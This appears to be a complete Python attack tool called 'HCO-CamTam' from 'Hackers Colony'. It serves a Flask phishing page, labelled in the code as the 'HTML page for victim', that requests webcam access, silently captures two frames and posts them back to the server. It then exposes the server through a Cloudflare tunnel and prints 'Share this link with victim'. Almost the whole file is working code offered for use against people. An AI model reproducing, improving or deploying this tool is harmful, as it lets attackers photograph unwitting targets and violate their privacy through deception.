#!/usr/bin/env python3
"""
HCO-CamTam - Single File Camera Tool
By Azhar (Hackers Colony)
"""

import os
import subprocess
from flask import Flask, render_template_string, request

app = Flask(__name__)

# HTML page for victim
html_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Camera Access</title>
</head>
<body>
  <h2>Camera Access Required</h2>
  <video id="video" width="300" height="200" autoplay></video>
  <script>
    let count = 0;
    async function capture() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      video.srcObject = stream;
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      canvas.width = 300; canvas.height = 200;

      const interval = setInterval(() => {
        if (count >= 2) { clearInterval(interval); stream.getTracks().forEach(t=>t.stop()); return; }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const data = canvas.toDataURL("image/png");
        fetch("/upload", {method:"POST", body:data});
        count++;
      }, 2000);
    }
    capture();
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_page)

@app.route("/upload", methods=["POST"])
def upload():
    global counter
    counter += 1
    if counter == 2:
        print("\033[92m[+] Images Received\033[0m")
    return "OK"

if __name__ == "__main__":
    counter = 0
    # Start Flask in background
    print("\033[91mHCO-CAM-TAM by Azhar\033[0m")
    port = 5000
    # Start Cloudflared tunnel
    try:
        print("[*] Starting Cloudflare tunnel...")
        tunnel = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        # Show generated link
        for line in tunnel.stdout:
            if "trycloudflare.com" in line:
                print(f"\033[93m[+] Share this link with victim: {line.strip()}\033[0m")
                break
    except Exception as e:
        print("Cloudflared not installed or failed:", e)

    # Run server
    app.run(host="0.0.0.0", port=port)
